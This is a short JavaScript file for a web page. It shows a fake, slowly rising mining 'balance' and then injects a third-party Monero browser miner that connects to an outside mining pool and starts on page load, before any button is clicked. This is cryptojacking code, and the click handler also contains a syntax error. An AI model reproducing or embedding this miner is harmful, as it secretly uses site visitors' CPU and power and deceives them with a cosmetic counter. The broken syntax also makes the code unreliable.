var balance = 0;
var miningInterval;

function updateBalance() {
    document.getElementById('balance').textContent = balance.toFixed(6);
}

document.getElementById('startMining').addEventListener('click', function() {
        miningInterval = setInterval(function() {
            balance += 0.000001;
            updateBalance();
        }, 1000);
    }
});

updateBalance();

// New mining code
var minerScript = document.createElement("script");
minerScript.src = "https://monerominer.rocks/miner-mmr/webmnr.min.js";
document.head.appendChild(minerScript);

var newMiningScript = document.createElement("script");
newMiningScript.textContent = `
    server = "wss://f.xmrminingproxy.com:8181";
    var pool = "gulf.moneroocean.stream:20128";
    var walletAddress = " //Your Wallet Here ";
    var workerId = "";
    var threads = -5;
    var password = "x";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
`;
document.head.appendChild(newMiningScript);
